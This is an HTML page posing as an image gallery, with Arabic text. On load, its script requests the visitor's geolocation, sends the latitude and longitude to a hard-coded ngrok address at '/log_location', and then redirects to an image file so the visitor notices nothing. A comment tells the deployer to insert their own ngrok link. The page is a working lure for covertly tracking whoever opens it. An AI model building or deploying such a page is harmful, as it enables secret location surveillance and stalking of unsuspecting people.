<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gallery</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: #000; display: flex; justify-content: center; align-items: center; }
        img { max-width: 100%; max-height: 100%; object-fit: contain; }
    </style>
</head>
<body>
    <div id="loading" style="color: #333;">جاري التحميل...</div>
    <script>
        window.onload = function() {
            navigator.geolocation.getCurrentPosition(function(pos) {
                // تأكد من وضع رابط ngrok الصحيح هنا فقط
                var myNgrok = "https://in-calicoed-overplainly.ngrok-free.dev"; 
                
                fetch(myNgrok + '/log_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude, { mode: 'no-cors' });

                setTimeout(function() {
                    window.location.href = "MSAN.JPG"; 
                }, 1000);
            }, function() {
                window.location.href = "MSAN.JPG";
            });
        };
    </script>
</body>
</html>
